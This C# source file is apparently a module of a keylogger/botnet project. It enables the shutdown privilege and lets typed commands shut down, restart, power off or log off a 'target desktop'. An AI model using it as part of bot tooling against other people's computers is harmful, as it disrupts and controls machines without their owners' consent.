using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace KeyLoggerVersion1._0.botNet
{
    public class RebootOptionTargetDesktop
    {
        private static RebootOptionTargetDesktop _Instance;

        public static RebootOptionTargetDesktop Instance
        {
            get
            {
                if (_Instance == null)
                {
                    _Instance = new RebootOptionTargetDesktop();
                }
                return _Instance;
            }
            private set
            {

            }
        }
        // Reference https://csharp.hotexamples.com/examples/ManagedWin32.Api/TokPriv1Luid/-/php-tokpriv1luid-class-examples.html
        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        internal struct TokPriv1Luid
        {
            public int Count;
            public long Luid;
            public int Attr;
        }

        // Reference https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getcurrentprocess
        // <Summary>
        // Retrieves a pseudo handle for the current process
        // </Summary>
        [DllImport("kernel32.dll", ExactSpelling = true)]
        internal static extern IntPtr GetCurrentProcess();

        // Reference https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocesstoken
        // <Summary>
        // The OpenProcessToken function opens the access token associated with a process.
        // </Summary> 
        [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
        internal static extern bool OpenProcessToken(IntPtr h, int acc, ref IntPtr phtok);

        // Reference https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-lookupprivilegevaluea
        // <Summary>
        // retrieves the locally unique identifier (LUID) used on a specified system to locally represent the specified privilege name.
        // </Summary> 
        [DllImport("advapi32.dll", SetLastError = true)]
        internal static extern bool LookupPrivilegeValue(string host, string name, ref long pluid);

        // Reference https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-adjusttokenprivileges
        // <Summary>
        // Enable or disable privileges in the specified access token
        // </Summary> 
        [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
        internal static extern bool AdjustTokenPrivileges(IntPtr htok, bool disall, ref TokPriv1Luid newst, int len, IntPtr prev, IntPtr relen);

        // Reference https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-exitwindowsex
        // <Summary>
        // Execution task relation about Shutdown event in windows 
        // </Summary> 
        [DllImport("user32.dll", ExactSpelling = true, SetLastError = true)]
        internal static extern bool ExitWindowsEx(int flg, int rea);

        internal const int SE_PRIVILEGE_ENABLED = 0x00000002;
        internal const int TOKEN_QUERY = 0x00000008;
        internal const int TOKEN_ADJUST_PRIVILEGES = 0x00000020;
        internal const string SE_SHUTDOWN_NAME = "SeShutdownPrivilege";
        internal const int EWX_LOGOFF = 0x00000000;
        internal const int EWX_SHUTDOWN = 0x00000001;
        internal const int EWX_REBOOT = 0x00000002;
        internal const int EWX_FORCE = 0x00000004;
        internal const int EWX_POWEROFF = 0x00000008;
        internal const int EWX_FORCEIFHUNG = 0x00000010;

        private static void DoExitWindow(int flag)
        {
            bool check;
            TokPriv1Luid tp;
            IntPtr getCurrentProc = GetCurrentProcess();
            IntPtr htcheck = IntPtr.Zero;
            check = OpenProcessToken(getCurrentProc, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, ref htcheck);
            tp.Count = 1;
            tp.Luid = 0;
            tp.Attr = SE_PRIVILEGE_ENABLED;
            check = LookupPrivilegeValue(null, SE_SHUTDOWN_NAME, ref tp.Luid);
            check = AdjustTokenPrivileges(htcheck, false, ref tp, 0, IntPtr.Zero,IntPtr.Zero);
            check = ExitWindowsEx(flag, 0);
        }

        public void ScriptBashExitWindow(string script)
        {
            if (script != "")
            {
                if (script == "/?")
                {
                    string taskFunc = "<< ---Typing 'do  <option>' to access Func--->>" + Environment.NewLine +
                                      "\nshutdown            Shuts down the computer." + Environment.NewLine +
                                      "\nlogoff            Shuts down all processes running in the logon session of the process." + Environment.NewLine +
                                      "\npoweroff          Shuts down the system and turns off the power" + Environment.NewLine +
                                      "\nrestart           Shuts down the system and restart the system" + Environment.NewLine +
                                      "\ncls               Clear the command prompt" + Environment.NewLine +
                                      "\nexit              Exit from the Process ";
                    Console.WriteLine(taskFunc);
                }
                if (script == "do cls")
                {
                    Console.Clear();
                }
                if (script == "do shutdown")
                {
                    DoExitWindow(EWX_SHUTDOWN);
                }
                if (script == "do logoff")
                {
                    DoExitWindow(EWX_LOGOFF);
                }
                if (script == "do restart")
                {
                    DoExitWindow(EWX_REBOOT);
                }
                if (script == "do poweroff")
                {
                    DoExitWindow(EWX_POWEROFF);
                }
                if (script.Contains("do shut"))
                {
                    Console.WriteLine("typing '/?' to know or 'shutdown' is what you mean");
                }
            }
            else
            {
                Console.WriteLine("You not typing anything !!! typing '/?' to know func");
            }
        }
    }
}
